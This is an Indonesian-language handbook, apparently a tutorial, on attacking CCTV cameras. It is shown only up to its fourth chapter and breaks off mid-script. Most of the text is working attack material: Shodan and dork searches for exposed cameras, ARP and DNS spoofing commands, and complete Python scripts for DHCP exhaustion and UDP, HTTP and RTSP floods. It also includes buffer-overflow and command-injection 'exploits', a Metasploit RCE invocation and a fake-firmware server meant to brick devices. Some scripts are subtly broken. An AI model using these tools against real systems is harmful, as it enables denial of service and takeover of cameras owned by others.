# **📹 BUKU PANDUAN CCTV HACKING: TEKNIK LENGKAP DAN SPESIFIK**
**Dari Pemicuan Error, Scanning, Eksploitasi, hingga Pengambilan Data Penuh**
**Edisi 2026 – Metode Terbaru & Terlengkap**

---

---

## **📋 DAFTAR ISI**

---

### **🔹 BAB 1: PENGENALAN CCTV DAN KEAMANANNYA**
- Arsitektur CCTV Modern
- Jenis-jenis CCTV dan Kerentanannya
- Mengapa CCTV Bisa Di-Hack?

---

### **🔹 BAB 2: PERSIAPAN LINGKUNGAN**
- Tools yang Diperlukan
- Setup Kali Linux untuk CCTV Hacking
- Setup Termux untuk CCTV Hacking

---

### **🔹 BAB 3: SCANNING DAN DETEKSI CCTV**
- Scanning Jaringan untuk Menemukan CCTV
- Deteksi CCTV dengan Shodan
- Deteksi CCTV dengan Nmap
- Deteksi CCTV dengan Masscan
- Deteksi CCTV dengan Google Dorks

---

### **🔹 BAB 4: PEMICUAN ERROR PADA CCTV**
- Metode 1: ARP Spoofing untuk Memutus Koneksi
- Metode 2: DHCP Exhaustion untuk Membanjiri Jaringan
- Metode 3: UDP Flood untuk Membuat CCTV Error
- Metode 4: HTTP Flood untuk Overload CCTV Web Interface
- Metode 5: RTSP Flood untuk Membuat Stream Error
- Metode 6: Exploit Firmware untuk Membuat CCTV Crash
- Metode 7: Fake Firmware Update untuk Membuat CCTV Brick

---

### **🔹 BAB 5: EKSPLOITASI CCTV**
- Metode 1: Default Credentials Attack
- Metode 2: Brute Force Attack dengan Hydra
- Metode 3: Exploit Vulnerability CCTV
- Metode 4: CSRF Attack untuk Mengubah Konfigurasi
- Metode 5: Session Hijacking
- Metode 6: Exploit RTSP Stream
- Metode 7: Exploit ONVIF Protocol

---

### **🔹 BAB 6: PENGAMBILAN ALIH CCTV**
- Metode 1: Akses Web Interface
- Metode 2: Capture Snapshot dari CCTV
- Metode 3: Download Rekaman Video
- Metode 4: Mengaktifkan/Menonaktifkan Rekaman
- Metode 5: Reboot/Mematikan CCTV
- Metode 6: Mengubah Konfigurasi CCTV

---

### **🔹 BAB 7: TEKNIK LANJUTAN**
- Metode 1: Firmware Extraction dan Modifikasi
- Metode 2: Backdoor pada CCTV
- Metode 3: Persistence pada CCTV
- Metode 4: Evasion Techniques
- Metode 5: Covering Tracks

---
### **🔹 BAB 8: STUDI KASUS DAN CONTOH NYATA**
- Kasus 1: Hacking CCTV Hikvision
- Kasus 2: Hacking CCTV Dahua
- Kasus 3: Hacking CCTV XiongMai
- Kasus 4: Hacking CCTV Axis

---
### **🔹 BAB 9: PERINGATAN ETIKA DAN LEGAL**
- Peringatan Etika
- Konsekuensi Hukum

---

---
---

---

## **🔹 BAB 1: PENGENALAN CCTV DAN KEAMANANNYA**

---

### **Arsitektur CCTV Modern**
CCTV modern umumnya terdiri dari komponen-komponen berikut:

```
┌───────────────────────────────────────────────────────────────────────────────┐
│                                                                               │
│   ┌─────────────┐    ┌─────────────┐    ┌───────────────────────────────────┐  │
│   │   Camera    │    │   NVR/DVR   │    │            Monitor               │  │
│   │ (IP/Analog) │───▶│ (Storage)    │───▶│ (Display & Control)              │  │
│   └─────────────┘    └─────────────┘    └───────────────────────────────────┘  │
│           │                  │                                      │          │
│           ▼                  ▼                                      ▼          │
│   ┌───────────────────────────────────────────────────────────────────────┐  │
│   │                                                                       │  │
│   │                        Jaringan (LAN/WAN/Internet)                      │  │
│   │                                                                       │  │
│   └───────────────────────────────────────────────────────────────────────┘  │
│                                                                               │
└───────────────────────────────────────────────────────────────────────────────┘
```

- **Camera (IP/Analog)**: Perangkat yang menangkap gambar/video.
- **NVR/DVR**: Perangkat penyimpan data (Network Video Recorder / Digital Video Recorder).
- **Monitor**: Perangkat untuk menampilkan gambar dari CCTV.
- **Jaringan**: Koneksi antara camera, NVR/DVR, dan monitor (bisa LAN, WAN, atau Internet).

---

### **Jenis-jenis CCTV dan Kerentanannya**

| **Jenis CCTV**       | **Protokol**               | **Port Umum**       | **Kerentanan**                                                                                     | **Tingkat Risiko** |
|----------------------|----------------------------|---------------------|---------------------------------------------------------------------------------------------------|-------------------|
| **IP Camera**        | RTSP, HTTP, ONVIF          | 554, 80, 8000, 8080 | Default credentials, firmware vulnerabilities, misconfigurations, exposed admin panels | ⭐⭐⭐⭐⭐ |
| **Analog (DVR)**     | Proprietary (Hikvision, Dahua) | 8000, 34567, 37777 | Default credentials, RCE vulnerabilities, buffer overflow, backdoor accounts                   | ⭐⭐⭐⭐ |
| **NVR**             | ONVIF, RTSP, HTTP          | 80, 554, 8000      | Default credentials, weak authentication, exposed management interfaces             | ⭐⭐⭐⭐ |
| **Wireless CCTV**    | WiFi (HTTP, RTSP)          | 80, 554, 8080      | WiFi vulnerabilities, weak encryption, default WiFi credentials                   | ⭐⭐⭐⭐⭐ |
| **PTZ (Pan-Tilt-Zoom)** | RTSP, ONVIF, Pelco-D      | 554, 80, 4000      | Default credentials, motor control vulnerabilities, DoS via command injection      | ⭐⭐⭐⭐ |

---

### **Mengapa CCTV Bisa Di-Hack?**
1. **Default Credentials**: Banyak CCTV menggunakan **username/password default** yang tidak diubah (contoh: `admin:admin`, `admin:12345`).
2. **Firmware Vulnerabilities**: Firmware yang **tidak diupdate** mengandung **bug** yang bisa dieksploitasi (contoh: buffer overflow, RCE).
3. **Exposed Admin Panels**: Panel admin CCTV **terpapar ke internet** tanpa autentikasi yang kuat.
4. **Weak Encryption**: Beberapa CCTV menggunakan **enkripsi lemah** atau **tidak menggunakan enkripsi** sama sekali.
5. **Misconfigurations**: Konfigurasi yang **salah** (contoh: port terbuka, autentikasi dinonaktifkan).
6. **Backdoor Accounts**: Beberapa merek CCTV memiliki **akun backdoor** yang tidak terdokumentasi.
7. **Lack of Updates**: Produsen CCTV **jarang merilis patch keamanan**, meninggalkan perangkat rentan.
8. **Third-Party Components**: Komponen pihak ketiga (contoh: library HTTP, RTSP) yang **rentan**.
9. **Physical Access**: Akses fisik ke perangkat memungkinkan **modifikasi firmware** atau **reset factory**.
10. **Supply Chain Attacks**: Perangkat CCTV yang **sudah terinfeksi malware** dari pabrik.

---
---
---

## **🔹 BAB 2: PERSIAPAN LINGKUNGAN**

---

### **Tools yang Diperlukan**
| **Tools**               | **Fungsi**                                                                                     | **Installasi (Kali Linux)**                     | **Installasi (Termux)**                     |
|------------------------|-----------------------------------------------------------------------------------------------|------------------------------------------------|--------------------------------------------|
| **Nmap**               | Network scanning, deteksi port terbuka                                                        | `apt install nmap`                            | `pkg install nmap`                          |
| **Masscan**            | Mass scanning (lebih cepat dari Nmap)                                                          | `apt install masscan`                         | `pkg install masscan`                       |
| **Shodan CLI**         | Search engine untuk perangkat terhubung internet                                             | `pip install shodan`                          | `pip install shodan`                        |
| **Hydra**              | Brute force attack                                                                           | `apt install hydra`                           | `pkg install hydra`                         |
| **Metasploit**         | Exploitation framework                                                                       | `apt install metasploit-framework`            | `pkg install metasploit`                    |
| **Wireshark**          | Packet capture dan analisis                                                                   | `apt install wireshark`                       | `pkg install wireshark` (butuh GUI)         |
| **Tcpdump**            | CLI packet capture                                                                           | `apt install tcpdump`                         | `pkg install tcpdump`                       |
| **FFmpeg**             | Capture dan rekam stream RTSP                                                                  | `apt install ffmpeg`                          | `pkg install ffmpeg`                        |
| **VLC**                | View RTSP stream                                                                              | `apt install vlc`                             | `pkg install vlc`                          |
| **Python 3**           | Scripting (untuk automasi)                                                                   | `apt install python3`                        | `pkg install python`                       |
| **Git**                | Clone repository tools                                                                       | `apt install git`                             | `pkg install git`                           |
| **Curl**               | HTTP requests                                                                                 | `apt install curl`                            | `pkg install curl`                          |
| **Netcat**             | Network debugging                                                                             | `apt install netcat-openbsd`                 | `pkg install netcat-openbsd`               |
| **Arp-Spoof**          | ARP spoofing (untuk memutus koneksi)                                                          | `apt install dsniff`                         | `pkg install dsniff`                        |
| **Bettercap**          | MITM framework                                                                               | `apt install bettercap`                       | `pkg install bettercap`                    |
| **Ettercap**           | MITM attack                                                                                   | `apt install ettercap`                       | `pkg install ettercap`                     |
| **Aircrack-ng**        | WiFi cracking (untuk CCTV wireless)                                                          | `apt install aircrack-ng`                     | `pkg install aircrack-ng`                   |
| **Iodine**             | DNS tunneling                                                                                 | `apt install iodine`                         | `pkg install iodine`                       |
| **Ngrok**              | Tunneling (untuk akses CCTV dari jarak jauh)                                                  | Download dari [ngrok.com](https://ngrok.com) | Download dari [ngrok.com](https://ngrok.com) |
| **OpenVAS**            | Vulnerability scanning                                                                       | `apt install openvas`                        | -                                          |

---

### **Setup Kali Linux untuk CCTV Hacking**
```bash
# Update sistem
sudo apt update && sudo apt upgrade -y

# Install tools dasar
sudo apt install -y nmap masscan hydra metasploit-framework wireshark tcpdump \
    ffmpeg vlc python3 git curl netcat-openbsd dsniff bettercap ettercap \
    aircrack-ng iodine openvas

# Install Shodan CLI
pip install shodan

# Install tools tambahan dari GitHub
git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb
sudo /opt/exploitdb/exploitdb/bin/searchsploit -u

# Setup OpenVAS (untuk vulnerability scanning)
sudo apt install -y openvas
sudo gvm-setup
sudo gvm-start
```

---

### **Setup Termux untuk CCTV Hacking**
```bash
# Update Termux
pkg update && pkg upgrade -y

# Install tools dasar
pkg install -y nmap masscan hydra python git curl netcat-openbsd tcpdump \
    ffmpeg vlc dsniff bettercap ettercap aircrack-ng iodine

# Install Shodan CLI
pip install shodan

# Install Metasploit (jika diperlukan)
pkg install -y unstable-repo
pkg install metasploit

# Setup storage untuk tools besar
termux-setup-storage
mkdir -p ~/cctv_tools
cd ~/cctv_tools
```

---
---
---

## **🔹 BAB 3: SCANNING DAN DETEKSI CCTV**

---

### **Scanning Jaringan untuk Menemukan CCTV**
Scanning jaringan adalah **langkah pertama** untuk menemukan CCTV yang terhubung. Gunakan tools berikut untuk mendeteksi perangkat CCTV.

---

#### **📌 Metode 1: Scanning dengan Nmap**
Nmap adalah tools **network scanning** yang powerful untuk mendeteksi perangkat, port terbuka, dan layanan yang berjalan.

```bash
# Scan semua perangkat di jaringan lokal (192.168.1.0/24)
nmap -sn 192.168.1.0/24

# Scan port umum CCTV (80, 8080, 8888, 554, 37777, 34567)
nmap -p 80,8080,8888,554,37777,34567 192.168.1.0/24 -sV --open

# Scan dengan script deteksi CCTV
nmap -p 80,8080,554,37777 --script http-cctv,rtsp-url-brute 192.168.1.0/24

# Scan dengan OS detection
nmap -O -p 80,8080,554 192.168.1.0/24

# Scan dengan service version detection
nmap -sV -p 80,8080,554,37777 192.168.1.0/24

# Simpan hasil scan ke file
nmap -p 80,8080,554,37777,34567 192.168.1.0/24 -sV -oN cctv_scan.txt
```

**Contoh Output:**
```
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.1.100
Host is up (0.045s latency).
PORT      STATE    SERVICE     VERSION
80/tcp    open     http        Hikvision DS-2CD webcam httpd
554/tcp   open     rtsp       Hikvision RTSP server
8000/tcp  open     http-alt   Hikvision web server
MAC Address: AA:BB:CC:DD:EE:FF (Hikvision)
```

---
#### **📌 Metode 2: Scanning dengan Masscan**
Masscan adalah tools **mass scanning** yang lebih cepat dari Nmap, cocok untuk scanning jaringan besar.

```bash
# Scan seluruh jaringan lokal untuk port CCTV
masscan 192.168.1.0/24 -p80,8080,554,37777,34567 --rate=1000 -oG cctv_masscan.txt

# Scan dengan rate lebih tinggi (untuk jaringan besar)
masscan 10.0.0.0/16 -p80,8080,554 --rate=10000 -oG cctv_masscan_large.txt

# Filter hasil scan untuk CCTV
cat cctv_masscan.txt | grep -E "80|8080|554|37777|34567"
```

**Contoh Output:**
```
# 192.168.1.100:80  open   tcp  80
# 192.168.1.101:554 open   tcp  554
# 192.168.1.102:8080 open tcp  8080
```

---
#### **📌 Metode 3: Scanning dengan Shodan**
Shodan adalah **search engine** untuk perangkat terhubung internet. Gunakan untuk menemukan CCTV yang **terpapar ke internet**.

```bash
# Login ke Shodan (daftar di shodan.io)
shodan init YOUR_API_KEY

# Search CCTV di Indonesia
shodan search "cctv" country:ID

# Search CCTV dengan merek tertentu
shodan search "Hikvision" country:ID
shodan search "Dahua" country:ID
shodan search "XiongMai" country:ID

# Search CCTV dengan port terbuka
shodan search "port:554" country:ID
shodan search "port:8000" country:ID

# Get detail perangkat
shodan host 192.168.1.100

# Search dengan filter tambahan
shodan search "Hikvision port:80" country:ID
```

**Contoh Output:**
```
192.168.1.100:80    Hikvision DS-2CD2032-I
192.168.1.101:554   Dahua IPC-HDBW4431R-Z
192.168.1.102:8080  XiongMai GM8135
```

---
#### **📌 Metode 4: Deteksi CCTV dengan Google Dorks**
Google Dorks adalah **query khusus** untuk mencari perangkat yang terpapar ke internet.

| **Merek CCTV** | **Google Dorks**                                                                                     |
|----------------|------------------------------------------------------------------------------------------------------|
| **Hikvision**  | `inurl:"/cgi-bin/magicBox.cgi?action="`                                                               |
| **Dahua**      | `inurl:"/cgi-bin/authLogin.cgi"`                                                                     |
| **XiongMai**   | `inurl:"/cgi-bin/userLogin.cgi"`                                                                     |
| **Axis**       | `inurl:"/axis-cgi/"`                                                                                 |
| **Generic**    | `inurl:"/view/view.shtml"`                                                                           |
| **RTSP**       | `inurl:"rtsp://"`                                                                                     |
| **ONVIF**      | `inurl:"/onvif/device_service"`                                                                       |
| **All CCTV**   | `intitle:"login" inurl:"/cgi-bin/"`                                                                  |
| **All CCTV**   | `intext:"CCTV" inurl:":8080"`                                                                         |

**Cara Pakai:**
1. Buka Google.
2. Masukkan query di atas.
3. Cari hasil yang menampilkan **login page** atau **admin panel** CCTV.

---
#### **📌 Metode 5: Deteksi CCTV dengan Censys**
Censys adalah alternatif Shodan yang bisa digunakan untuk mencari perangkat terhubung internet.

```bash
# Install censys-cli
pip install censys

# Search CCTV
censys search --query 'services.service_name: RTSP' --page 1

# Search dengan filter
censys search --query 'services.port: 554 and location.country_code: ID' --page 1
```

---
#### **📌 Metode 6: Deteksi CCTV dengan FOCA**
FOCA (Fingerprinting Organizations with Collected Archives) adalah tools untuk **metadata extraction** dan **fingerprinting**.

```bash
# Install FOCA
git clone https://github.com/ElevenPaths/FOCA.git
cd FOCA
sudo apt install -y python3-qt5
python3 FOCA.py
```

---
#### **📌 Metode 7: Deteksi CCTV dengan Maltego**
Maltego adalah tools **OSINT** untuk **visualisasi relasi** antara perangkat, IP, dan domain.

```bash
# Install Maltego
wget https://www.maltego.com/downloads/maltego-ce.deb
sudo dpkg -i maltego-ce.deb
sudo apt --fix-broken install

# Gunakan Maltego untuk:
# - Cari IP yang terhubung ke CCTV.
# - Cari domain yang terkait dengan CCTV.
# - Visualisasikan jaringan CCTV.
```

---
---
---

## **🔹 BAB 4: PEMICUAN ERROR PADA CCTV**

---
### **Metode 1: ARP Spoofing untuk Memutus Koneksi**
**Konsep:** ARP Spoofing adalah teknik **Man-in-the-Middle (MITM)** yang memungkinkan attacker untuk **mengalihkan traffic** atau **memutus koneksi** antara CCTV dan jaringan.

**Tools:** `arpspoof`, `ettercap`, `bettercap`

---
#### **📌 Cara 1: ARP Spoofing dengan Arpspoof**
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Temukan gateway dan IP CCTV
route -n  # Cari gateway (contoh: 192.168.1.1)
nmap -sn 192.168.1.0/24 | grep "CCTV"  # Cari IP CCTV (contoh: 192.168.1.100)

# Jalankan ARP spoofing
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1  # Spoof gateway ke CCTV
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100  # Spoof CCTV ke gateway

# Verifikasi ARP table
arp -a
```

**Hasil:**
- CCTV **kehilangan koneksi** ke jaringan.
- Traffic CCTV **dialihkan ke attacker**.

---
#### **📌 Cara 2: ARP Spoofing dengan Ettercap**
```bash
# Jalankan Ettercap
ettercap -T -q -i eth0 -M ARP:REMOTE /192.168.1.1/ /192.168.1.100/

# Atau dengan GUI
ettercap -G
# Pilih: ARP Poisoning → Sniff Unified
# Pilih: Gateway (192.168.1.1) dan Target (192.168.1.100)
```

---
#### **📌 Cara 3: ARP Spoofing dengan Bettercap**
```bash
# Install Bettercap
sudo apt install bettercap

# Jalankan Bettercap
bettercap -iface eth0

# Di dalam Bettercap:
net.probe on
arp.spoof on
set arp.spoof.targets 192.168.1.100
```

---
#### **📌 Cara 4: ARP Spoofing + DNS Spoofing (Untuk Memutus Akses ke Internet)**
```bash
# Jalankan ARP spoofing
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Jalankan DNS spoofing
echo "192.168.1.100 *.google.com" > spoofhosts
dnsspoof -i eth0 -f spoofhosts

# Atau dengan Ettercap
ettercap -T -q -i eth0 -P dns_spoof -M ARP:REMOTE /192.168.1.1/ /192.168.1.100/
```

**Hasil:**
- CCTV **tidak bisa terhubung ke internet**.
- Semua request DNS **dialihkan ke attacker**.

---
#### **📌 Cara 5: ARP Spoofing + Traffic Blocking (Untuk Memutus Akses ke Server)**
```bash
# Jalankan ARP spoofing
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Block traffic ke port CCTV (80, 554, 8000)
iptables -A FORWARD -p tcp --dport 80 -j DROP
iptables -A FORWARD -p tcp --dport 554 -j DROP
iptables -A FORWARD -p tcp --dport 8000 -j DROP

# Atau block semua traffic dari CCTV
iptables -A FORWARD -s 192.168.1.100 -j DROP
```

**Hasil:**
- CCTV **kehilangan akses ke server**.
- Semua traffic **diblock**.

---
---
### **Metode 2: DHCP Exhaustion untuk Membanjiri Jaringan**
**Konsep:** DHCP Exhaustion adalah teknik **membanjiri DHCP server** dengan **permintaan IP** sehingga **IP habis** dan perangkat baru (termasuk CCTV) **tidak bisa mendapatkan IP**.

**Tools:** `Scapy`, `Yersinia`

---
#### **📌 Cara 1: DHCP Exhaustion dengan Scapy (Python)**
```python
#!/usr/bin/env python3
from scapy.all import *
import random
import string
import time

def generate_mac():
    """Generate random MAC address"""
    return ":".join("".join(random.choices("0123456789ABCDEF", k=2)) for _ in range(6))

def dhcp_exhaust(gateway_ip, interface):
    """Exhaust DHCP pool"""
    for i in range(256):  # Coba 256 MAC address (batas DHCP umum)
        mac = generate_mac()
        print(f"[*] Sending DHCP request from {mac}...")

        # Buat DHCP Discover packet
        dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                       IP(src="0.0.0.0", dst="255.255.255.255") / \
                       UDP(sport=68, dport=67) / \
                       BOOTP(chaddr=mac) / \
                       DHCP(options=[("message-type", "discover"), "end"])

        sendp(dhcp_discover, iface=interface, verbose=False)
        time.sleep(0.1)  # Delay untuk menghindari deteksi

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 dhcp_exhaust.py <gateway_ip> <interface>")
        print("Example: python3 dhcp_exhaust.py 192.168.1.1 eth0")
        sys.exit(1)

    gateway = sys.argv[1]
    interface = sys.argv[2]
    dhcp_exhaust(gateway, interface)
```

**Cara Pakai:**
```bash
python3 dhcp_exhaust.py 192.168.1.1 eth0
```

**Hasil:**
- DHCP server **kehabisan IP**.
- CCTV **tidak bisa mendapatkan IP** → **kehilangan koneksi**.

---
#### **📌 Cara 2: DHCP Exhaustion dengan Yersinia**
```bash
# Install Yersinia
sudo apt install yersinia

# Jalankan Yersinia (DHCP mode)
yersinia -G
# Pilih: DHCP
# Pilih: Discover (untuk membanjiri DHCP server)
```

---
---
### **Metode 3: UDP Flood untuk Membuat CCTV Error**
**Konsep:** UDP Flood adalah serangan **Denial of Service (DoS)** yang mengirimkan **paket UDP besar** ke CCTV sampai **overload**.

**Tools:** `hping3`, `Python (socket)`

---
#### **📌 Cara 1: UDP Flood dengan Hping3**
```bash
# UDP Flood ke port 554 (RTSP)
hping3 --udp --flood -p 554 192.168.1.100

# UDP Flood ke port 80 (HTTP)
hping3 --udp --flood -p 80 192.168.1.100

# UDP Flood ke port 8000 (Admin Panel)
hping3 --udp --flood -p 8000 192.168.1.100

# UDP Flood dengan spoofed IP
hping3 --udp --flood -p 554 --spoof 1.1.1.1 192.168.1.100
```

**Hasil:**
- CCTV **overload** dan **crash**.
- **RTSP stream** menjadi **error**.

---
#### **📌 Cara 2: UDP Flood dengan Python**
```python
#!/usr/bin/env python3
import socket
import threading
import sys
import random

class UDPFlooder:
    def __init__(self, target_ip, target_port, num_threads=100):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.running = True

    def flood(self):
        """Send UDP packets ke target"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running:
            try:
                # Generate random data (1KB)
                data = os.urandom(1024)
                sock.sendto(data, (self.target_ip, self.target_port))
            except:
                pass

    def start(self):
        """Start UDP flood dengan multiple threads"""
        print(f"[*] Starting UDP flood on {self.target_ip}:{self.target_port}")
        print(f"[*] Threads: {self.num_threads}")

        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(target=self.flood, daemon=True)
            threads.append(t)
            t.start()

        try:
            while True:
                pass
        except KeyboardInterrupt:
            print("\n[!] Attack stopped")
            self.running = False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 udp_flood.py <target_ip> [port] [threads]")
        print("Example: python3 udp_flood.py 192.168.1.100 554 100")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 554
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 100

    flooder = UDPFlooder(target, port, threads)
    flooder.start()
```

**Cara Pakai:**
```bash
python3 udp_flood.py 192.168.1.100 554 100
```

**Hasil:**
- CCTV **menerima paket UDP besar** → **overload** → **error**.

---
---
### **Metode 4: HTTP Flood untuk Overload CCTV Web Interface**
**Konsep:** HTTP Flood adalah serangan **Denial of Service (DoS)** yang mengirimkan **request HTTP besar** ke web interface CCTV sampai **overload**.

**Tools:** `hping3`, `Slowloris`, `Python (requests)`

---
#### **📌 Cara 1: HTTP Flood dengan Hping3**
```bash
# HTTP Flood ke port 80
hping3 -S --flood -p 80 192.168.1.100

# HTTP Flood ke port 8000
hping3 -S --flood -p 8000 192.168.1.100

# HTTP Flood dengan spoofed IP
hping3 -S --flood -p 80 --spoof 1.1.1.1 192.168.1.100
```

---
#### **📌 Cara 2: HTTP Flood dengan Slowloris**
```bash
# Install Slowloris
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py 192.168.1.100 -p 80 -s 500
```

---
#### **📌 Cara 3: HTTP Flood dengan Python**
```python
#!/usr/bin/env python3
import requests
import threading
import sys
import random

class HTTPFlooder:
    def __init__(self, target_url, num_threads=100):
        self.target_url = target_url
        self.num_threads = num_threads
        self.running = True
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        ]

    def flood(self):
        """Send HTTP requests ke target"""
        while self.running:
            try:
                headers = {"User-Agent": random.choice(self.user_agents)}
                requests.get(self.target_url, headers=headers, timeout=5)
            except:
                pass

    def start(self):
        """Start HTTP flood dengan multiple threads"""
        print(f"[*] Starting HTTP flood on {self.target_url}")
        print(f"[*] Threads: {self.num_threads}")

        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(target=self.flood, daemon=True)
            threads.append(t)
            t.start()

        try:
            while True:
                pass
        except KeyboardInterrupt:
            print("\n[!] Attack stopped")
            self.running = False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 http_flood.py <target_url> [threads]")
        print("Example: python3 http_flood.py http://192.168.1.100:80 100")
        sys.exit(1)

    target = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 100

    flooder = HTTPFlooder(target, threads)
    flooder.start()
```

**Cara Pakai:**
```bash
python3 http_flood.py http://192.168.1.100:80 100
```

**Hasil:**
- Web interface CCTV **overload** → **error** → **tidak bisa diakses**.

---
---
### **Metode 5: RTSP Flood untuk Membuat Stream Error**
**Konsep:** RTSP Flood adalah serangan **Denial of Service (DoS)** yang mengirimkan **request RTSP besar** ke CCTV sampai **stream error**.

**Tools:** `Python (socket)`, `FFmpeg`

---
#### **📌 Cara 1: RTSP Flood dengan Python**
```python
#!/usr/bin/env python3
import socket
import threading
import sys
import random

class RTSPFlooder:
    def __init__(self, target_ip, target_port=554, num_threads=100):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_threads = num_threads
        self.running = True

    def flood(self):
        """Send RTSP requests ke target"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target_ip, self.target_port))

                # RTSP OPTIONS request
                request = (
                    "OPTIONS rtsp://{}/ RTSP/1.0\r\n"
                    "CSeq: 1\r\n"
                    "User-Agent: Mozilla/5.0\r\n"
                    "\r\n"
                ).format(self.target_ip)

                sock.send(request.encode())
                sock.close()
            except:
                pass

    def start(self):
        """Start RTSP flood dengan multiple threads"""
        print(f"[*] Starting RTSP flood on {self.target_ip}:{self.target_port}")
        print(f"[*] Threads: {self.num_threads}")

        threads = []
        for i in range(self.num_threads):
            t = threading.Thread(target=self.flood, daemon=True)
            threads.append(t)
            t.start()

        try:
            while True:
                pass
        except KeyboardInterrupt:
            print("\n[!] Attack stopped")
            self.running = False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 rtsp_flood.py <target_ip> [port] [threads]")
        print("Example: python3 rtsp_flood.py 192.168.1.100 554 100")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 554
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 100

    flooder = RTSPFlooder(target, port, threads)
    flooder.start()
```

**Cara Pakai:**
```bash
python3 rtsp_flood.py 192.168.1.100 554 100
```

**Hasil:**
- CCTV **menerima request RTSP besar** → **stream overload** → **error**.

---
#### **📌 Cara 2: RTSP Flood dengan FFmpeg**
```bash
# Kirim request RTSP terus-menerus
while true; do
    ffmpeg -i rtsp://192.168.1.100:554/stream1 -f null - 2>/dev/null &
done
```

**Hasil:**
- FFmpeg **terus menerus request RTSP** → CCTV **overload** → **stream error**.

---
---
### **Metode 6: Exploit Firmware untuk Membuat CCTV Crash**
**Konsep:** Beberapa CCTV memiliki **vulnerability** di firmware-nya yang bisa dieksploitasi untuk **membuat perangkat crash**.

---
#### **📌 Cara 1: Exploit Buffer Overflow**
Beberapa CCTV (contoh: **XiongMai**) memiliki **buffer overflow vulnerability** di **HTTP server** atau **RTSP server**.

**Contoh Exploit (Python):**
```python
#!/usr/bin/env python3
import socket
import sys

def exploit_buffer_overflow(target_ip, target_port, payload):
    """Exploit buffer overflow vulnerability"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))

        # Kirim payload
        sock.send(payload.encode())
        sock.close()
        print(f"[+] Payload sent to {target_ip}:{target_port}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 exploit_bo.py <target_ip> <target_port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    # Payload buffer overflow (contoh: 1000 byte "A")
    payload = "A" * 1000

    exploit_buffer_overflow(target_ip, target_port, payload)
```

**Cara Pakai:**
```bash
python3 exploit_bo.py 192.168.1.100 80
```

**Hasil:**
- CCTV **crash** karena **buffer overflow**.

---
#### **📌 Cara 2: Exploit Command Injection**
Beberapa CCTV (contoh: **Hikvision**) memiliki **command injection vulnerability** di **CGI script**.

**Contoh Exploit (Python):**
```python
#!/usr/bin/env python3
import requests
import sys

def exploit_command_injection(target_url, payload):
    """Exploit command injection vulnerability"""
    try:
        url = f"{target_url}/cgi-bin/magicBox.cgi?action={payload}"
        response = requests.get(url, timeout=5)
        print(f"[+] Payload sent to {url}")
        print(f"[+] Response: {response.text[:200]}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit_ci.py <target_url>")
        print("Example: python3 exploit_ci.py http://192.168.1.100")
        sys.exit(1)

    target_url = sys.argv[1]

    # Payload command injection (contoh: reboot)
    payload = "reboot"

    exploit_command_injection(target_url, payload)
```

**Cara Pakai:**
```bash
python3 exploit_ci.py http://192.168.1.100
```

**Hasil:**
- CCTV **menjalankan command** (contoh: `reboot`) → **crash**.

---
#### **📌 Cara 3: Exploit with Metasploit**
Metasploit memiliki **exploit module** untuk beberapa merek CCTV.

```bash
# Start Metasploit
msfconsole

# Cari exploit untuk CCTV
search cctv
search type:exploit cctv

# Contoh: Exploit untuk Hikvision
use exploit/linux/http/hikvision_remote_code_execution
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
exploit
```

**Hasil:**
- Metasploit **menjalankan exploit** → CCTV **terkompromi** → **crash**.

---
---
### **Metode 7: Fake Firmware Update untuk Membuat CCTV Brick**
**Konsep:** Beberapa CCTV **menerima firmware update** dari server eksternal. Attacker bisa **mengganti firmware** dengan **firmware palsu** yang **membuat CCTV brick**.

---
#### **📌 Cara 1: Fake Firmware Update via HTTP**
1. **Temukan URL firmware update** (contoh: `http://192.168.1.100/cgi-bin/firmwareUpdate.cgi`).
2. **Buat firmware palsu** (contoh: file kosong atau file yang rusak).
3. **Host firmware palsu** di server attacker.
4. **Trick CCTV untuk download firmware palsu**.

**Contoh Script (Python):**
```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

class FakeFirmwareServer(BaseHTTPRequestHandler):
    def do_GET(self):
        """Kirim firmware palsu"""
        if self.path == "/firmware.bin":
            # Kirim firmware palsu (contoh: file kosong)
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Disposition", "attachment; filename=firmware.bin")
            self.end_headers()
